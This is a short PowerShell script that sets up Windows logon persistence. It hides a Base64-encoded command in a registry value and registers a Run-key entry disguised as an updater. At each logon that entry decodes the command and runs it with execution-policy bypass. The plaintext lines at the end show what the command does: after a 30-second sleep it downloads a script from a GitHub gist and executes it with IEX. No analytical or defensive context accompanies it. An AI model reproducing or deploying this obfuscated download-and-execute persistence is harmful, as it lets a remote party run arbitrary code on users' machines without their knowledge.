New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\" -Name HermesConfig -Value "UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBzACAAMwAwADsASQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcABzADoALwAvAGcAaQBzAHQALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAEgAZQByAG0AZQBzAEQAZQByAEIAbwB0AGUALwBhAGIAMABhADQAOAAxADIAMwA2AGYAMQAzADcAMgBmAGUAOQBjADcAOAA1ADMAYgBlADkANgA5ADEANQBjAGEALwByAGEAdwAvADgANgA0AGEANAAyADgAYQBkAGIAYwBiADUANAAyADcAMwBlADEAYQA3ADYAYgAxADEAYQAzADQAOQAzADUAOQAxAGQANQA3ADEANAAwAGYALwBnAGkAcwB0AGYAaQBsAGUAMQAuAHQAeAB0ACcAKQApAAoA" -PropertyType String -Force 


New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name HermesUpdtr3 -Value '"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "$x=((gp HKCU:Software\Microsoft\Windows\CurrentVersion HermesConfig).HermesConfig); powershell -NoLogo -NonInteractive -ep bypass -EncodedCommand $x"' -PropertyType String -Force 


https://gist.githubusercontent.com/HermesDerBote/ab0a481236f1372fe9c7853be96915ca/raw/2e44cf0835cc2b88cfd920a91a715e18eec69f27/gistfile1.txt
Start-Sleep -s 30;IEX ((new-object net.webclient).downloadstring('https://gist.githubusercontent.com/HermesDerBote/ab0a481236f1372fe9c7853be96915ca/raw/864a428adbcb54273e1a76b11a3493591d57140f/gistfile1.txt')
